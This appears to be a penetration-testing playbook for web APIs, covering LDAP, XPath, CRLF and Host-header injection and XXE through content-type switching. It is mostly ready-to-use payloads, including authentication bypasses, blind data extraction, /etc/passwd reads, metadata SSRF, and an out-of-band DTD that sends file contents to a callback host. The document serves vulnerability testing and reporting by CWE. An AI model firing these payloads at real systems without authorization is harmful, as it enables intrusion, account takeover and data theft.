# LDAP, XPath, Header Injection, and XXE via Content-Type Confusion

## LDAP filter injection

APIs backing auth/search onto a directory build filters like
`(&(uid=INPUT)(password=INPUT))`. Metacharacters: `* ( ) \ |` and NUL.

Probes (username field unless noted):

```
*                      wildcard — all entries match (enumeration oracle)
*)(uid=*))(|(uid=*     auth bypass: closes the AND, ORs a true clause
admin)(&)              '(&)' is LDAP TRUE — bypass when password clause follows
admin))%00             truncate the rest of the filter (legacy)
```

Boolean-blind attribute extraction when match/no-match is observable:

```
admin)(description=A*        → walk attribute values char by char
admin)(objectClass=*         → always-true control
```

Response signals: login success without valid password, result-count change,
or server errors (`Invalid DN syntax`, `Bad search filter`,
`javax.naming.directory`). CWE-90.

## XPath injection

XML-backed lookups (`//user[name='INPUT' and pass='INPUT']`):

```
' or '1'='1                          auth bypass
' or ''='                           minimal variant
'] | //user | a['                   node-set smuggling
' and count(/*)=1 and '1'='1        structure oracle (boolean-blind)
' and string-length(name(/*[1]))=4 and '1'='1    walk the tree
' and substring(name(/*[1]),1,1)='r' and '1'='1  extract names char by char
```

Blind extraction walks the document: root name → child count → child names →
text values. XPath has no comments pre-2.0, so balance the quotes
(`' or '1'='1` style). CWE-643.

## CRLF / header injection

Any param reflected into a response header (redirect `Location`, cookies,
content-disposition filenames):

```
%0d%0aSet-Cookie:%20sid=attacker
%0d%0aLocation:%20https://198.51.100.9/
%0d%0a%0d%0a<html>injected body</html>     (response splitting)
```

**Host header**: on password-reset/invite endpoints, send
`Host: 203.0.113.5` (or `X-Forwarded-Host: 203.0.113.5`) and check whether
the generated link in the email/response uses it — poisoned reset link =
account takeover primitive. Also test cache poisoning when a cache key
ignores the header. CWE-113 / CWE-644.

**Log injection**: `%0d%0a` or `\n` in logged fields (User-Agent, usernames)
forges log entries; pair with log-viewer features for stored XSS.

## Content-type confusion → XXE

Many frameworks register both JSON and XML message converters. Take a working
JSON request and re-send it as XML:

```
POST /v1/orders HTTP/1.1
Host: api.example.com
Content-Type: application/xml

<?xml version="1.0"?>
<order><customer_id>1</customer_id><note>test</note></order>
```

If the server parses it (200/validation error about *fields*, not about
*format*), the XML parser is reachable. Also try
`Content-Type: text/xml` and `application/x-www-form-urlencoded` →
`application/xml` flips on SOAP-ish backends.

### Classic XXE (in-band file read)

```xml
<?xml version="1.0"?>
<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<order><note>&xxe;</note></order>
```

Put `&xxe;` in a field that is echoed back (validation errors that quote the
field value are perfect). One line of `/etc/passwd` is proof. CWE-611.

### SSRF via XXE

```xml
<!DOCTYPE order [<!ENTITY xxe SYSTEM "http://192.0.2.10:8080/internal">]>
```

Target internal services / cloud metadata (`http://169.254.169.254/latest/meta-data/`
on AWS-shaped targets). Response content or timing/error differences map the
internal network.

### Blind / OOB XXE (parameter entities)

When nothing reflects, exfiltrate via DNS/HTTP to interactsh. Host `evil.dtd`
on your callback server:

```xml
<!-- evil.dtd on http://203.0.113.7/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://203.0.113.7/?d=%file;'>">
%wrap;
%send;
```

Request body:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://203.0.113.7/evil.dtd"> %dtd;]>
<r>x</r>
```

Even a bare `<!ENTITY % x SYSTEM "http://xxxxxxxx.oast.example.net/"> %x;`
proving the fetch is a confirmed blind XXE. Error-based variant: point `%send`
at `file:///nonexistent/%file;` and read the file content out of the parser's
error message.

### Billion laughs (detect, don't detonate)

Prove entity *expansion* with a two-level, bounded test, not the full bomb:

```xml
<!DOCTYPE r [<!ENTITY a "AAAA"><!ENTITY b "&a;&a;&a;&a;">]>
<r>&b;</r>
```

16 `A`s in the response = recursive entity expansion enabled → report DoS
exposure (CWE-776) without sending the 10-level 3GB version.

### Other XML surfaces

- File-upload endpoints that accept DOCX/XLSX/SVG (all XML containers) —
  embed the DOCTYPE in `[Content_Types].xml` / the SVG itself.
- `XInclude` when you control only a fragment, not the DOCTYPE:
  `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
- SOAP endpoints discovered alongside REST (`/ws`, `?wsdl`).

Findings: CWE-611 (XXE), CWE-90 (LDAP), CWE-643 (XPath), CWE-113 (CRLF),
each with the confirming `http_exchange` (or the interactsh hit transcript
plus the triggering request for blind cases). Endpoint → `exploited`.
